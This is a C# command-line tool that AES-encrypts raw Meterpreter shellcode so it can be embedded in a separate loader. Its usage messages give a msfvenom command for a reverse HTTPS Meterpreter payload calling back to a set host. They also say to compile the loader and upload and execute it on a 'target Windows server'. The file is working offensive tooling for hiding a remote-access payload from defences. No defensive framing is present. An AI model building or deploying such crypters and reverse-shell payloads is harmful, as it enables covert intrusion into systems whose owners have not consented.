using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Security.Cryptography;

namespace encryptor
{
    class Program
    {
        static void Main(string[] args)
        {            
            string rawsc_path = "";
            string encrypted_output_path = "encrypted_output.bin";
            byte[] buf = null;

            try
            {
                // read meterpreter raw file path from 1st command line parameter and read it into a byte array
                rawsc_path = args[0];
                buf = File.ReadAllBytes(rawsc_path);
                //Console.WriteLine("test_buffer_length: {0}", buf.Length);
            }
            catch (Exception e)
            {
                Console.WriteLine("[!] Error: {0}", e.Message);
                Console.WriteLine("[+] Usage:");
                Console.WriteLine("[+] encryptor.exe <path_to_raw_shellcode_file> <output_file>");
                Console.WriteLine("[+] ");
                Console.WriteLine("[+] Example to generate a raw meterpreter shellcode:");
                Console.WriteLine("[+]   msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.38.144 LPORT=443 -f raw -o mp_https443.bin");
                return;
            }
                      
            // convert the byte array to string for AES encryption, avoid to use System.Text.Encoding.Default
            //string original = System.Text.Encoding.Default.GetString(buf, 0, buf.Length);
			string original = Convert.ToBase64String(buf);

            using (Aes myAes = Aes.Create())
            {
                // Encrypt the string to an array of bytes.
                byte[] encrypted = EncryptStringToBytes_Aes(original, myAes.Key, myAes.IV);

                try
                {
                    encrypted_output_path = args[1];
                    File.WriteAllBytes(encrypted_output_path, encrypted);
                }
                catch (Exception e)
                {
                    Console.WriteLine("[!] Error: {0}", e.Message);
                    Console.WriteLine("[+] Usage:");
                    Console.WriteLine("[+] encryptor.exe <path_to_raw_shellcode_file> <output_file>");
                    return;
                }

                // Decrypt the bytes to a string.
                string roundtrip = DecryptStringFromBytes_Aes(encrypted, myAes.Key, myAes.IV);

                // convert buf into String
                StringBuilder hex_buf = new StringBuilder(buf.Length * 2);
                foreach (byte b in buf)
                {
                    hex_buf.AppendFormat("0x{0:x2},", b);
                }

                // convert encrypted byte array into hex format
                StringBuilder hex_encrypted = new StringBuilder(encrypted.Length * 2);
                foreach (byte b in encrypted)
                {
                    hex_encrypted.AppendFormat("0x{0:x2},", b);
                }

                // convert roundtrip string into buf array
                //byte[] buffer = System.Text.Encoding.Default.GetBytes(roundtrip);
								byte[] buffer = Convert.FromBase64String(roundtrip);

                StringBuilder hex_roundtrip = new StringBuilder(buffer.Length * 2);
                foreach (byte b in buffer)
                {
                    hex_roundtrip.AppendFormat("0x{0:x2},", b);
                }

                //Remove the last ','
                string hex_enc_string = hex_encrypted.ToString();
                hex_enc_string = hex_enc_string.Remove(hex_enc_string.Length-1, 1);

                //Display the original data and the decrypted data.
                //Console.WriteLine("Buf_SC:   {0}", hex_buf.ToString());
                string tmp = "{ " + hex_enc_string + " };";
                Console.WriteLine("\nPayloadLength:{0}", encrypted.Length);
                Console.WriteLine("\nEncrypted:{1}", encrypted.Length, tmp);
                Console.WriteLine("\nAES_Key:{0}", System.Convert.ToBase64String(myAes.Key));
                Console.WriteLine("AES_IV:{0}", System.Convert.ToBase64String(myAes.IV));
                //Console.WriteLine("encrypted buffer length: {0}", encrypted.Length);
                //Console.WriteLine("RoundTrip buffer length: {0}", buffer.Length);
                Console.WriteLine("\n[+] Copy the above AES key, IV and encrytped shellcode buf into aesloader.cs");
                Console.WriteLine("[+] Run the following command to compile aesloader.cs:");
                Console.WriteLine("[+]   mono-csc -out:aesloader64.exe -platform:x64 aesloader.cs");
                Console.WriteLine("[+] Upload the aesloader64.exe to target Windows server and execute it from there.");
            }
        }


        static byte[] EncryptStringToBytes_Aes(string plainText, byte[] Key, byte[] IV)
        {
            byte[] encrypted;

            using (Aes aesAlg = Aes.Create())
            {
                aesAlg.Key = Key;
                aesAlg.IV = IV;

                ICryptoTransform encryptor = aesAlg.CreateEncryptor(aesAlg.Key, aesAlg.IV);

                using (MemoryStream msEncrypt = new MemoryStream())
                {
                    using (CryptoStream csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write))
                    {
                        using (StreamWriter swEncrypt = new StreamWriter(csEncrypt))
                        {
                            swEncrypt.Write(plainText);
                        }
                        encrypted = msEncrypt.ToArray();
                    }
                }
            }
            return encrypted;
        }

        static string DecryptStringFromBytes_Aes(byte[] cipherText, byte[] Key, byte[] IV)
        {
            string plaintext = null;

            using (Aes aesAlg = Aes.Create())
            {
                aesAlg.Key = Key;
                aesAlg.IV = IV;

                // Create a decryptor to perform the stream transform.
                ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);

                // Create the streams used for decryption.
                using (MemoryStream msDecrypt = new MemoryStream(cipherText))
                {
                    using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                    {
                        using (StreamReader srDecrypt = new StreamReader(csDecrypt))
                        {
                            // Read the decrypted bytes from the decrypting stream
                            // and place them in a string.
                            plaintext = srDecrypt.ReadToEnd();
                        }
                    }
                }
            }
            return plaintext;
        }
    }
}